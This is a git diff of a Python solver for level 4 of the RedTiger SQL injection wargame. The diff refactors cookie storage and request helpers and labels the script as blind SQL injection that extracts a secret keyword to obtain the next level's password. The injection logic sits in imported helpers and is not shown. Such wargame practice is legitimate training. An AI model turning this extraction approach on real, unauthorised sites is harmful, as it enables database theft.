@@ -1,10 +1,14 @@
 #!/usr/bin/env python3
 import pickle
 import tigers as tg
+import tiger_cookies
+from connect import my_request as req
 
 
 def main():
     '''
+    Blind SQL Injection.
+
     Target: Get the value of the first entry in table level4_secret in column keyword
     Disabled: like
     '''
@@ -12,18 +16,10 @@ def main():
     url = "https://redtiger.labs.overthewire.org/level4.php"
     finds = 'keyword'  # What we are finding
     pass_r = 'The password for the next level is: '
+    level = 'level4login'
 
-    try:
-        with open('cooks.pickle', 'rb') as f:
-            cooks = pickle.load(f)
-        if 'level4login' not in cooks:
-            print('use prevision level')
-            exit(1)
-    except:
-        print('use level 1')
-        exit(1)
-
-    cook = dict(level4login=cooks['level4login'])
+    cooks = tiger_cookies.check_cookies(level)
+    cook = dict(level4login=cooks[level])
 
     # Find len of key
     len_of_key = tg.find_key_len(url,
@@ -39,16 +35,12 @@ def main():
 
     # Authorization
     data = dict(secretword=key, go='Go!')
-    response = tg.get_request(url, data, cook, method='post')
+    response = req.post_request(url, data, cook)
 
     # Еxtracting data from html
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
-
-    # Save cookie
-    if ('level5login' not in cooks) or (cooks['level5login'] != passw):
-        cooks['level5login'] = passw
-        tg.save_cookies(cooks)
+    tiger_cookies.save_cookies(cooks, level, passw)
 
 
 if __name__ == '__main__':
